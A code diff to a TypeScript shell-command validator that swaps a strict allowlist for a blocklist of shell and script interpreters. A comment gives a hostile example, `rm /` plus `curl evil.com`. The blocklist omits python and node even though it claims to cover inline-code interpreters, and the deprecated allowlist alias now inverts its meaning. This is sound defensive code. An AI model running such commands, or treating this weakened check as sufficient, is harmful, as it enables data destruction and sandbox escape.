@@ -1,78 +1,41 @@
 /**
- * Shell command allowlist - strict command validation.
+ * Shell command validation — blocklist-based.
  *
- * Only commands on this list can be executed.
- * This is a security boundary - never allow arbitrary commands.
+ * Container isolation (read-only rootfs, network policy, cap-drop ALL,
+ * pid/mem limits) is the security boundary. The blocklist only prevents
+ * shell interpreters that could bypass metacharacter validation via
+ * `bash -c "..."` style invocations.
  */
 
 import { tokenize } from './shell-tokenizer.js';
 
 /**
- * Default allowlist of safe commands.
+ * Blocklisted shell interpreters.
  *
- * These commands are safe to run in a controlled environment.
- * node/npm/npx are allowed because skills often require SDK installation.
- * Container isolation (read-only rootfs, network policy, pid/mem limits) provides security.
+ * These can execute arbitrary strings (e.g. `bash -c "rm / ; curl evil.com"`),
+ * bypassing the metacharacter check. All other binaries are allowed —
+ * the container is the security boundary.
  */
-export const DEFAULT_ALLOWLIST = new Set([
-  // Core utilities
-  'echo',
-  'cat',
-  'head',
-  'tail',
-  'wc',
-  'grep',
-  'sort',
-  'uniq',
-  'cut',
-  'awk',
-  'sed',
-  'tee',
-  'xargs',
-  'tr',
-  'diff',
-  'touch',
-  'chmod',
-
-  // File operations
-  'ls',
-  'pwd',
-  'mkdir',
-  'cp',
-  'mv',
-  'rm',
-  'find',
-  'date',
-
-  // Archive
-  'tar',
-  'gzip',
-  'gunzip',
-  'zip',
-  'unzip',
-
-  // Version control
-  'git',
-
-  // Network (for provenance tagging)
-  'curl',
-  'wget',
-  'jq',
-
-  // Runtime (container-isolated, needed for SDK-based skills)
-  'node',
-  'npm',
-  'npx',
-  'python',
-  'python3',
-  'pip',
-  'pip3',
-
-  // System info
-  'uname',
-  'whoami',
-  'id',
+export const SHELL_BLOCKLIST = new Set([
+  'bash',
+  'sh',
+  'dash',
+  'zsh',
+  'csh',
+  'tcsh',
+  'ksh',
+  'fish',
+  // Script interpreters that accept -e/-c style inline code
+  'perl',
+  'ruby',
+  'lua',
+  'tclsh',
 ]);
+
+/**
+ * @deprecated Use SHELL_BLOCKLIST. Kept for backward compatibility.
+ */
+export const DEFAULT_ALLOWLIST = SHELL_BLOCKLIST;
 
 /**
  * Network-capable commands (for provenance tagging).
@@ -93,23 +56,23 @@ export interface ValidationResult {
 }
 
 /**
- * Validate a single command against the allowlist.
+ * Validate a single command against the blocklist.
  *
  * @param command - Command name (without arguments)
- * @param allowlist - Set of allowed commands (defaults to DEFAULT_ALLOWLIST)
+ * @param blocklist - Set of blocked commands (defaults to SHELL_BLOCKLIST)
  * @returns Validation result
  */
 export function validateCommand(
   command: string,
-  allowlist: Set<string> = DEFAULT_ALLOWLIST
+  blocklist: Set<string> = SHELL_BLOCKLIST
 ): ValidationResult {
-  // Strip leading path (e.g., /usr/bin/cat -> cat)
+  // Strip leading path (e.g., /usr/bin/bash -> bash)
   const baseCommand = command.split('/').pop() ?? command;
 
-  if (!allowlist.has(baseCommand)) {
+  if (blocklist.has(baseCommand)) {
     return {
       valid: false,
-      reason: `Command not allowed: ${baseCommand}`,
+      reason: `Shell interpreter not allowed: ${baseCommand}. Use commands directly instead of wrapping in ${baseCommand} -c.`,
     };
   }
 
@@ -130,16 +93,16 @@ export function isNetworkCommand(command: string): boolean {
 /**
  * Validate a pipeline of commands (e.g., "cat file | grep pattern").
  *
- * Each command in the pipeline must be on the allowlist.
+ * Each command in the pipeline is checked against the blocklist.
  * Uses quote-aware tokenizer so that `|` inside quotes is not treated as a pipe.
  *
  * @param pipeline - Full command string with optional pipes
- * @param allowlist - Set of allowed commands (defaults to DEFAULT_ALLOWLIST)
+ * @param blocklist - Set of blocked commands (defaults to SHELL_BLOCKLIST)
  * @returns Validation result
  */
 export function validatePipeline(
   pipeline: string,
-  allowlist: Set<string> = DEFAULT_ALLOWLIST
+  blocklist: Set<string> = SHELL_BLOCKLIST
 ): ValidationResult {
   const { segments } = tokenize(pipeline);
 
@@ -147,7 +110,7 @@ export function validatePipeline(
     return { valid: false, reason: 'Malformed command (unterminated quote)' };
   }
 
-  // Validate each segment's first token against allowlist
+  // Validate each segment's first token against blocklist
   const commandNames: string[] = [];
   for (const tokens of segments) {
     const commandName = tokens[0];
@@ -156,7 +119,7 @@ export function validatePipeline(
       return { valid: false, reason: 'Empty command in pipeline' };
     }
 
-    const result = validateCommand(commandName, allowlist);
+    const result = validateCommand(commandName, blocklist);
     if (!result.valid) {
       return result;
     }
@@ -175,10 +138,7 @@ export function validatePipeline(
 }
 
 /**
- * Create a custom allowlist from an array of commands.
- *
- * @param commands - Array of command names
- * @returns Set of commands
+ * @deprecated No longer needed — blocklist model allows all non-interpreter commands.
  */
 export function createAllowlist(commands: string[]): Set<string> {
   return new Set(commands);
